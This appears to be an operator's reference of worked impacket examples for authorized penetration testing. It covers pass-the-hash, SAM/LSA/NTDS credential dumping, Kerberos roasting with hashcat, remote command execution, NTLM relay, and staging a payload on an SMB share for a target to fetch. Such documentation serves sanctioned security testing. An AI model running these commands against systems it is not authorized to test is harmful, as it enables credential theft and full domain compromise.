# impacket — worked examples

Every command below was run inside a throwaway copy of the agent image on
2026-09-17, against loopback only. Output is verbatim except for elided hash
bodies (`…`). Examples that need a Windows target cannot be executed here;
where that is the case the command is marked **not executed** and only the
verified failure mode or the documented output shape is shown.

Conventions: `$TARGET` is an authorized host, `$WORK` is the per-engagement
directory (`/working/engagements/<name>`), `$DC` is the domain controller.

Versions in this image: impacket `0.14.0.dev0+20260916.40533.c38d1eeb`,
NetExec `1.5.1+0.c7dc286b`. Scripts live in `/opt/venvs/impacket/bin`.

---

## 1. Loopback smoke test: `smbserver.py` + `smbclient.py`

The only way to verify an impacket workflow end to end without an authorized
Windows host. Do this before trusting a staging share against a real target.

```bash
mkdir -p /tmp/imp/share/sub
echo 'hello from the share' > /tmp/imp/share/share-file.txt
echo nested > /tmp/imp/share/sub/nested.txt

smbserver.py -smb2support -username smbuser -password smbpass SHARE /tmp/imp/share &
```

Startup output is almost nothing — the banner, then silence until a client
connects (add `-debug` for the protocol chatter):

```
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies
```

After a client enumerates the share, the same stdout shows:

```
[*] NetrShareEnum Level: 1
```

Interactive client (the share list comes from `shares`, then `use SHARE`):

```bash
smbclient.py smbuser:smbpass@127.0.0.1 <<'CMDS'
shares
use SHARE
ls
pwd
put /tmp/imp/localfile.txt
get share-file.txt
exit
CMDS
```

```
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# Share Name                Type            Comment
----------------------------------------------------------------------
IPC$                      DISK
SHARE                     DISK
# # -rw-rw-rw-         21  Thu Sep 17 20:45:38 2026 share-file.txt
drw-rw-rw-       4096  Thu Sep 17 20:45:38 2026 sub
# /
# -rw-rw-rw-         21  Thu Sep 17 20:45:38 2026 share-file.txt
drw-rw-rw-       4096  Thu Sep 17 20:45:38 2026 sub
# Bye!
```

`get`/`put` take one argument. `get share-file.txt /tmp/out` fails:

```
[-] [Errno 2] No such file or directory: 'share-file.txt /tmp/out'
```

The server-side log records SMB operations when `-outputfile` is used:

```
09/17/2026 08:45:44 PM: INFO: NetrShareEnum Level: 1
```

## 2. Pass-the-hash against the lab share (`-hashes`)

Compute the NT hash with impacket — `hashlib.new('md4')` fails in this image:

```bash
NT=$(python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('smbpass').hex())")
echo "$NT"          # d75431eb358edcabbf20e45787c3fb5f

smbclient.py -hashes ":$NT" smbuser@127.0.0.1 <<'CMDS'
shares
CMDS
```

```
# Share Name                Type            Comment
----------------------------------------------------------------------
IPC$                      DISK
SHARE                     DISK
```

A wrong hash produces the authentication failure to expect in the field:

```bash
smbclient.py -hashes ":00000000000000000000000000000000" smbuser@127.0.0.1
```

```
[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
```

## 3. Credential dumping

**Not executed in this session** — it needs an authorized Windows host. The
commands and flags below are read from `secretsdump.py -h`; the output shape is
documented behaviour, and the failure mode when the target is not Windows *is*
verified (see the end of this section).

Against an authorized Windows host (admin) — remote SAM + LSA over the remote
registry:

```bash
secretsdump.py 'CORP/alice:Passw0rd!@10.0.0.20' \
  -outputfile "$WORK/loot/impacket/sam-10.0.0.20"
```

Expected shape (not observed here):

```
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x…
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
...
[*] Cleaning up...
```

Writes `PREFIX.sam` and `PREFIX.secrets` for the SAM and LSA sections
(suffixes read from `impacket/examples/secretsdump.py`).

Domain-wide NTDS via DRSUAPI (domain admin; this is a full domain credential
compromise — confirm before running):

```bash
secretsdump.py -just-dc 'CORP/Administrator:Passw0rd!@$DC' -outputfile "$WORK/loot/impacket/ntds"
secretsdump.py -just-dc-ntlm 'CORP/Administrator:Passw0rd!@$DC'      # NTLM only, no Kerberos keys
secretsdump.py -just-dc-user alice 'CORP/Administrator:Passw0rd!@$DC' # one account
secretsdump.py -use-vss 'CORP/Administrator:Passw0rd!@$DC'           # NTDSUTIL/VSS instead of DRSUAPI
```

Offline, no network — parse hives copied to `$WORK`:

```bash
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Feed the dump straight to hashcat (`user:rid:lm:nt:::` needs `--username`):

```bash
hashcat -a 0 -m 1000 "$WORK/loot/impacket/sam-10.0.0.20.sam" --username \
  /opt/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt </dev/null
```

**Verified failure mode when the target is not Windows** (impacket's own
`smbserver.py` on loopback, valid credentials):

```bash
secretsdump.py smbuser:smbpass@127.0.0.1
```

```
[-] RemoteOperations failed: SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found} The file %hs does not exist.
[*] Cleaning up...
```

## 4. Kerberoasting and AS-REP roasting

```bash
GetUserSPNs.py -dc-ip "$DC" -request 'CORP/alice:Passw0rd!' \
  -outputfile "$WORK/loot/kerberoast.txt"
GetSPNs_output=$(GetUserSPNs.py -dc-ip "$DC" 'CORP/alice:Passw0rd!')   # enumeration only
GetNPUsers.py -dc-ip "$DC" -request -format hashcat \
  -usersfile "$WORK/users.txt" -no-pass 'CORP/' -outputfile "$WORK/loot/asrep.txt"
```

Hash formats — the exact text the roasting scripts print (shape verified via
hashcat's `--identify`, which returns mode 13100 for a real `$krb5tgs$23$`
blob; the account/SPN fields come from the target):

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$b548e10f…$35e8e456…
$krb5asrep$23$alice@CORP.LOCAL:0e0e5f…$…
```

```bash
hashcat -a 0 -m 13100 "$WORK/loot/kerberoast.txt" \
  /opt/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -r /usr/share/hashcat/rules/best64.rule --potfile-path "$WORK/loot/krb.pot" </dev/null
hashcat -a 0 -m 18200 "$WORK/loot/asrep.txt" \
  /opt/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt </dev/null
```

**Verified failure mode with no DC reachable** (loopback):

```bash
GetNPUsers.py -dc-ip 127.0.0.1 -no-pass 'lab.local/smbuser'
```

```
[*] Getting TGT for smbuser
[-] [Errno Connection error (127.0.0.1:88)] [Errno 111] Connection refused
```

```bash
GetUserSPNs.py -dc-ip 127.0.0.1 -request 'lab.local/smbuser:smbpass'
```

```
[-] [Errno 111] Connection refused
```

## 5. Remote command execution

**Not executed in this session** — needs an authorized Windows host. Flags are
verified from each script's `-h`; the failure mode on a non-Windows target is
verified and listed below.

```bash
psexec.py 'CORP/alice:Passw0rd!@10.0.0.20'                       # interactive SYSTEM shell
psexec.py 'CORP/alice:Passw0rd!@10.0.0.20' -service-name pentest -path 'C:\Windows\Temp\t.exe'
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c 'CORP/alice@10.0.0.20' 'whoami /all'
atexec.py 'CORP/alice:Passw0rd!@10.0.0.20' 'cmd /c hostname'
smbexec.py 'CORP/alice:Passw0rd!@10.0.0.20'
dcomexec.py 'CORP/alice:Passw0rd!@10.0.0.20'
```

All of these write artifacts on the target (a service, a scheduled task, files
in `ADMIN$`), except `wmiexec.py`/`dcomexec.py`.

**Verified failure modes against a non-Windows SMB server** (valid creds):

| Script | Output |
|---|---|
| `psexec.py smbuser:smbpass@127.0.0.1` | `[-] SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found}` |
| `wmiexec.py smbuser:smbpass@127.0.0.1` | `[*] SMBv3.0 dialect used` then `[-] Could not connect: [Errno 111] Connection refused` |
| `reg.py smbuser:smbpass@127.0.0.1 query -keyName 'HKLM\SOFTWARE'` | `[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...` then `STATUS_NO_SUCH_FILE` |
| `lookupsid.py smbuser:smbpass@127.0.0.1` | `[*] Brute forcing SIDs at 127.0.0.1` / `[*] StringBinding ncacn_np:127.0.0.1[\pipe\lsarpc]` then `STATUS_NO_SUCH_FILE` |

## 6. Registry, SID and SAMR enumeration

**Not executed in this session** (needs an authorized Windows host); every flag
below is verified from the scripts' `-h` output.

```bash
reg.py 'CORP/alice:Passw0rd!@10.0.0.20' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
reg.py 'CORP/alice:Passw0rd!@10.0.0.20' save -keyName 'HKLM\SAM' -o '\\127.0.0.1\SHARE'
lookupsid.py 'CORP/alice:Passw0rd!@10.0.0.20' 20000      # maxRid is positional
lookupsid.py 'CORP/alice:Passw0rd!@10.0.0.20' -domain-sids
samrdump.py 'CORP/alice:Passw0rd!@10.0.0.20'
rpcdump.py 'CORP/alice:Passw0rd!@10.0.0.20'
```

## 7. Staging files for a target to fetch

```bash
mkdir -p "$WORK/loot/shares/pub" && cp ./payload.exe "$WORK/loot/shares/pub/"
smbserver.py -smb2support -username stage -password 'Staging!23' \
  -outputfile "$WORK/loot/shares/access.log" PUB "$WORK/loot/shares/pub"
# on the authorized target:  copy \\<tunnel-ip>\PUB\payload.exe C:\Windows\Temp\
```

The listener is reachable on every address in the container's netns, including
the WireGuard tunnel address, not just loopback. Take it down when the transfer
is done and keep `access.log` as evidence.

## 8. NTLM relay (`ntlmrelayx.py`) — authorization required

```bash
# 1. find targets with signing disabled (uses nxc; `nxc smb` is broken in this
#    image, see tools/netexec/AGENTS.md — use `nxc smb --gen-relay-list` only
#    after the dploot pin is fixed)
nxc smb 10.0.0.0/24 --gen-relay-list "$WORK/relay-targets.txt"

# 2. relay
ntlmrelayx.py -tf "$WORK/relay-targets.txt" -smb2support -of "$WORK/loot/relayed.txt"
```

Verified startup sequence in this image (with HTTP/WCF/raw listeners disabled
and SMB port 445 free):

```
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

If port 445 is already taken (for example by your own `smbserver.py`) it
tracebacks in `impacket/examples/ntlmrelayx/servers/smbrelayserver.py`
`start_servers`. Check `ss -ltnp` first.

## 9. Useful one-liners

```bash
# which impacket version is actually installed
python3 -c "from impacket import version; print(version.BANNER)"

# NT hash for a known password (for -hashes testing)
python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Password1').hex())"

# every impacket script available
ls /opt/venvs/impacket/bin | grep -E '\.py$' | sort

# per-script flags when a doc and the binary disagree
secretsdump.py -h | sed -n '/^  -/,/^$/p'
```
